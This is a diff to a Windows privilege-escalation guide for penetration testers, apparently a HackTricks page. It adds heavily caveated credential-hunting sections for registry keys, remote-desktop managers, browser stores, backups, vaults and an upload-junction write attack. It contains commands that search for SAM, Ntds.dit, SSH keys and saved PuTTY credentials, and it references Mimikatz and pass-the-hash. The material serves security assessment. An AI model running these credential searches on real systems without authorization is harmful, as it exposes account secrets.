+Treat `DefaultUserName` and `DefaultDomainName` as account context, not credentials. A nonempty `DefaultPassword` or `AltDefaultPassword` value is a plaintext registry finding. If `AutoAdminLogon=1` but no plaintext password is readable, that is only a lead: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), and ordinary registry reads do not establish whether that secret exists or can be retrieved. Review access rights and the actual logon configuration before reporting a credential exposure.
 
 ### Credentials manager / Windows vault
 
@@ -1283,6 +1402,8 @@ dpapi-extracting-passwords.md
 
 **PowerShell credentials** are often used for **scripting** and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using **DPAPI**, which typically means they can only be decrypted by the same user on the same computer they were created on.
 
+An exported credential can have an arbitrary filename or `.xml` path. When a script or file inventory points to one, resolve the account's actual profile directory rather than assuming `C:\Users`: [Windows can place profiles elsewhere](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). A readable file is only a lead; [Windows `Export-Clixml` binds an encrypted credential to the exporting user and computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), and any recovered account must separately have valid rights on the intended service. Inspect paths and ACLs first, without printing encrypted or plaintext values during routine enumeration.
+
 To **decrypt** a PS credentials from the file containing it you can do:
 
 ```bash
@@ -1328,9 +1449,15 @@ HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
 You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module
 
+**mRemoteNG uses a different connection store.** Inspect readable XML under `%APPDATA%\mRemoteNG` and user Documents, including files with ordinary names such as `config.xml`. Identify the connection schema and encrypted `Password` attributes before treating an XML file as a credential lead. The stored value is not a DPAPI/RDCMan password; recovery depends on the file's encryption settings and whether a custom master password was used. Avoid printing encrypted values during broad enumeration.
+
+**Remote Desktop Plus profile exports** may also be readable in user directories or a shared administration folder. A legacy `profiles.xml` export has `Data/Profile` entries with `ProfileName`, `Password`, and `Secure` elements. Treat a nonempty password element as a credential lead, without printing it or assuming it is plaintext: [the vendor notes](https://www.donkz.nl/) that profile protection can be bound to the creating account and computer, or configured less strictly. Confirm the file's origin and recovery conditions before relying on it.
+
 ### Sticky Notes
 
-People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.
+People sometimes save passwords and other information in sticky-note applications. Microsoft's packaged Sticky Notes app commonly stores notes at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; older or different apps may use other user-profile stores, including LevelDB. Identify the installed app and storage format before treating a missing SQLite file as absence of notes.
+
+If Sticky Notes is using SQLite write-ahead logging, a copy of `plum.sqlite` alone can omit recent committed notes. Keep the matching `plum.sqlite-wal` with a consistent copy of the database, and include `plum.sqlite-shm` when available; the shared-memory index can be rebuilt, but the WAL is part of the database's persistent state. See [SQLite's WAL documentation](https://www.sqlite.org/wal.html). A note containing an account name or password is only a credential lead: verify the account, permitted access, and password reuse separately. An encrypted password-manager record additionally requires its actual decryption key and application-specific interpretation before it can establish a higher-privilege login.
 
 ### AppCmd.exe
 
@@ -1431,11 +1558,49 @@ else { Write "Not Installed." }
 
 ## Files and Registry (Credentials)
 
+### Support-tool registry credential artifacts
+
+Some older remote-support installations retain password-related value names under fixed application registry keys. For example, TeamViewer's `SecurityPasswordAES` identified a configured static session password in versions before 9, according to the [vendor's registry-key explanation](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). A value-name marker is only a review lead: verify the installed version, readable value data, format and current authentication behavior before assessing that credential. Moving from a remote-support password to a more privileged Windows account additionally requires actual password reuse and authorization for that account. Keep ciphertext and recovered passwords out of routine enumeration output.
+
+### Shared spreadsheets with protected sheets
+
+If a readable shared workbook is suspected of holding account data, distinguish **file encryption** from worksheet protection or hidden columns. [Microsoft states](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) that worksheet protection controls editing and is not a security feature; it does not by itself establish that the workbook contents are encrypted. Review only authorized, relevant files and avoid printing candidate secrets during broad enumeration. A readable `.xlsx` path, a protected sheet, or a hidden column alone does not prove that credentials exist or that any account has higher privileges; verify the actual data and current account rights separately.
+
+### CI server retained change patches
+
+A CI server may retain submitted source changes under its data directory even after the build finishes. [TeamCity documents](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` as storage for remote-run changes; the data directory can be configured and is not necessarily under `ProgramData`. A readable patch can preserve removed or added references to a credential file, an encryption key, or a script that uses both. For example, a PowerShell `ConvertTo-SecureString -Key` workflow needs the AES key as well as the encrypted string; [Microsoft documents](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) that the key is supplied separately. Review only accessible patch names first, then inspect relevant content under authorization without printing secrets in routine enumeration output. A patch path, an encrypted value, or a key reference alone does not prove a valid credential or higher-privilege access. Restrict data-directory ACLs and avoid committing secrets to build changes.
+
+### Custom local administrator password rotation
+
+A homegrown password rotator may store an encrypted local administrator password in a local service while keeping its datastore credentials in a readable `.env` file or beside the updater binary. Review the updater's scheduled task, account, configuration ACLs, listener, and datastore permissions together. A loopback-only datastore is still reachable to a local user who has valid credentials, but authentication alone does not prove permission to read the relevant records. If the encryption seed or key material is accessible beside the ciphertext, review the exact key derivation before trusting the encryption. A scheme that deterministically derives an AES key from an exposed seed using Go's [`math/rand`](https://pkg.go.dev/math/rand) is unsuitable for protecting that password; Go documents that package as inappropriate for security-sensitive randomness. Confirm that any recovered password is current and belongs to a local Administrators-group account before treating it as an escalation path. A scheduled task, `.env` path, or encrypted blob alone proves none of those conditions. Keep passwords and key material out of routine enumeration output.
+
+Use [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) for managed local administrator passwords. Its directory or Entra-backed storage and access controls are distinct from a custom local datastore; [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) likewise decide whether an authenticated datastore user can read a specific index.
+
+### Java server plugin archives and credential reuse
+
+Some Java server plugins are distributed as JAR archives in a server's `plugins` directory. A readable custom plugin may contain configuration or bytecode with an embedded service credential. Review the archive only when authorized and keep recovered secrets out of routine enumeration output. A plugin path alone does not prove that a secret exists, and a recovered service password leads to higher privileges only if it is also valid for a more privileged account. Check the relevant file ACLs and replace reused credentials with distinct secrets. See [PaperMC's plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) for the directory layout and [Oracle's JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) for archive contents.
+
+### Openfire embedded database credentials
+
+An Openfire installation using its embedded database may keep `openfire.script` under `Openfire\embedded-db`. If the current account can read it, review the `OFUSER` records and the `passwordKey` property together. Openfire's [user-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) says passwords can be stored in plain text or encrypted with a key held in that property. A recovered password only matters for escalation if it is still valid for a more privileged identity; the file name alone proves neither read access nor credential reuse. The path is an inventory cue, so keep database content and credentials out of routine enumeration output.
+
+The separate `Openfire\conf\openfire.xml` file can reveal the admin console's configured ports and bind interface even when an external database is used. Openfire commonly binds its admin console to loopback; that still leaves a local account able to reach the address if the listener is running. Check the actual listener, authorized admin role, plugin-upload policy, and Openfire service identity together. An admin who can install a plugin may cause plugin code to run in the service's context, which can be highly privileged when the service runs as LocalSystem. A matching account password or a readable configuration path alone does not prove admin-console access or code execution. See the vendor's [installation and plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) and [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).
+
+### Forensic management server configuration
+
+Velociraptor server configurations, commonly named `server.config.yaml`, can contain the internal CA's `CA.private_key`. If a lower-privileged user can read that key, they may be able to mint an API client certificate. Whether this leads to higher privileges depends on the server's user roles, API reachability, and the identity under which the server or target agent executes. A client configuration contains different material; finding one does not establish access to the server CA. Some deployments keep the CA private key offline, so a readable server configuration may also lack the signing key.
+
+On a Windows server, inspect the ACL of the **server** configuration in its installation directory and any protected backup copies. One possible location is `%ProgramFiles%\VelociraptorServer\server.config.yaml`; use the service's configured path when it differs. Confirm that the current identity can read the file and that `CA.private_key` is actually present. Avoid printing the private key in logs or enumeration output. The vendor's `config api_client` workflow uses the CA key to issue a client certificate, but an effective server-side role is also needed; creating or changing one can require datastore write access or a restart. An existing privileged server identity may provide a route even when those writes are unavailable. API queries with execution rights run in the relevant server or agent context, which can be highly privileged.
+
+Protect the server configuration and backups with restrictive ACLs, keep the CA signing key offline where possible, and limit API roles and listener access. See the [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) and [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/).
+
 ### Putty Creds
 
 ```bash
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
 ```
+
+Solar-PuTTY is a separate session manager. Its native encrypted store may be at `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, while an exported session backup can be named `sessions-backup.dat` and stored elsewhere. [SolarWinds' export guide](https://thwack.solarwinds.com/discussion/comment/115591) says exports are password-encrypted and can contain sessions, keys, scripts, tags, and relationships; its [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifies the native store. Check file permissions and paths first. Finding either file does not reveal its password or prove that any saved credential remains valid or has higher privileges.
 
 ### Putty SSH Host Keys
 
@@ -1515,6 +1680,8 @@ Example content:
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
 
+Readable Windows Imaging (`.wim`) backup files can also contain offline `SAM`, `SECURITY`, and `SYSTEM` hives. Prioritize locally accessible backup or image directories and inspect an image's **member names** before extracting anything; a `.wim` filename alone does not prove hive exposure, and routine `install.wim`, `boot.wim`, and recovery images are common false leads. An SMB share is a separate access path and should be checked only when that share is in scope. See Microsoft's [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) and [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).
+
 ### Cloud Credentials
 
 ```bash
@@ -1587,6 +1754,17 @@ Example of web.config with credentials:
     </forms>
 </authentication>
 ```
+
+### Backup archives in an IIS webroot
+
+An old ZIP backup placed directly in a served webroot may expose prior configuration files and reusable credentials. Check the site's configured physical path and whether the archive is actually reachable over HTTP before treating it as an exposure. The default `C:\inetpub\wwwroot` path is only a candidate. A quick local inventory can list names and sizes without opening archives:
+
+```powershell
+Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
+  Where-Object Name -Match 'backup' | Select-Object Name, Length
+```
+
+An archive name does not establish that it contains a secret or that a recovered credential grants higher privilege.
 
 ### OpenVPN credentials
 
@@ -1663,6 +1841,7 @@ cesi.conf
 supervisord.conf
 tomcat-users.xml
 *.kdbx
+*.psafe3
 KeePass.config
 Ntds.dit
 SAM
@@ -1700,11 +1879,15 @@ TypedURLs       #IE
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 ```
 
+Password Safe v3 databases commonly use the `.psafe3` extension. Treat a matching filename as an encrypted vault candidate; its presence does not establish that you can read it, unlock it, or use any stored credentials. Check accessible user profiles and configured file-sharing roots when reviewing where such files are stored.
+
+A readable KeePass `.kdbx` is likewise only an encrypted-vault lead. Unlocking it requires the actual master-password and any configured key-file or account factors. If an authorized review finds an LM:NT hash pair in an entry, verify the named account and whether the NT hash is current and accepted by the target's NTLM service before considering [pass-the-hash](../ntlm/README.md#pass-the-hash). A vault entry does not grant Administrator or SYSTEM rights on its own; remote service access, account rights, and any separate service-execution step must also hold. Inventory should report the vault path and readability, not print the database or stored credentials.
+
 Search all of the proposed files:
 
 ```
 cd C:\
-dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
+dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
 ```
 
 ```
@@ -1713,7 +1896,11 @@ Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAct
 
 ### Credentials in the RecycleBin
 
-You should also check the Bin to look for credentials inside it
+Check accessible Recycle Bin entries for deleted backups and configuration archives as well as files whose names explicitly mention credentials. A useful `.7z`, `.zip`, or `.rar` backup may be months old and have an ordinary filename. Windows stores the original path and deletion time in a `$I` record and the deleted file as its paired `$R` entry; inspect the metadata and the current identity's read access before opening an archive. Visibility depends on the volume, user SID, and file permissions, so an empty listing does not prove that no recoverable backup exists. Treat an archive name as a review candidate, not proof that it contains a valid secret.
+
+An accessible deleted `.pfx` can also be a **code-signing** lead. If it contains an accessible private key, the key can sign a changed PowerShell script; [PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), and [AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Cross-account execution requires the current identity to modify the exact script, an effective rule that accepts the resulting signature for the script and target account, and a scheduled task or other higher-privilege consumer that actually runs it. A `.pfx` filename, certificate subject, or writable script alone does not establish the chain. Review metadata, ACLs, policy, and the scheduled command before opening private-key material or triggering the task.
+
+Also review accessible messaging-client profile databases, notes, and received files for credential leads. A BitLocker recovery export may be stored as HTML or TXT, sometimes inside a named backup archive. Such material can provide access to a separate encrypted data volume containing older backups; inspect the volume and archive only when access is authorized. If a backup includes `NTDS.dit`, offline domain credential recovery also requires the matching `SYSTEM` hive, as described in the [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md). File names and a locked volume alone do not establish that a usable recovery key or domain backup exists.
 
 To **recover passwords** saved by several programs you can use: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
 
@@ -1732,8 +1919,12 @@ reg query "HKCU\Software\OpenSSH\Agent\Key"
 
 ### Browsers History
 
-You should check for dbs where passwords from **Chrome or Firefox** are stored.\
+You should check for dbs where passwords from **Chrome, Edge, or Firefox** are stored.\
 Also check for the history, bookmarks and favourites of the browsers so maybe some **passwords are** stored there.
+
+For the current user's conventional Edge **Default** profile, `Login Data` is under `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, while `Local State` is in its parent `User Data` directory. [Microsoft documents the default profile location](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); another profile or a `UserDataDir` policy can move it. File presence is only a credential-store lead: confirm readable files, the applicable user's DPAPI context or other authorized key material, and whether a saved login belongs to a more privileged account. Path-only enumeration need not open the database or print decrypted passwords.
+
+For Firefox, [Mozilla documents](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) that a profile's `key4.db` and `logins.json` are the paired key and encrypted-login files. Their presence is only a lead: check whether both files are readable, whether saved entries exist, and whether a Primary Password protects the key before concluding that credentials are usable. If a recovered credential belongs to a domain account, review that account's effective group-control rights and the group's [LAPS password read or decrypt rights](../active-directory-methodology/laps.md) separately; browser artifacts alone do not establish an administrator path.
 
 Tools to extract passwords from browsers:
 
@@ -1933,6 +2124,12 @@ Then **read this to learn about UAC and UAC bypasses:**
 {{#ref}}
 ../authentication-credentials-uac-and-efs/uac-user-account-control.md
 {{#endref}}
+
+## Upload Directory Junctions into a Served Root
+
+An application may create a predictable upload subdirectory, write a caller-supplied filename into it, and then process the file. If a low-privilege user can remove and replace that subdirectory with an NTFS junction before the server-side write, the write may follow the junction into a web-served directory. A script placed there can run as the web-service identity if the server executes that file type. This is an application-specific arbitrary-write boundary; a writable upload directory or an existing junction alone does not prove it.
+
+Check the exact path construction and timing in the upload handler, the user's effective delete/create rights on the subdirectory, the destination's effective ACLs, whether the writer follows reparse points, and whether the web server executes files in that destination. Confirm the writer's and web server's process identities separately. Passive inventory can show directory ACLs and reparse metadata, but it cannot establish the handler's behavior or a future junction swap. If execution lands in a service account, inspect the **actual process token** before considering any separate token-privilege path.
 
 ## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP
 
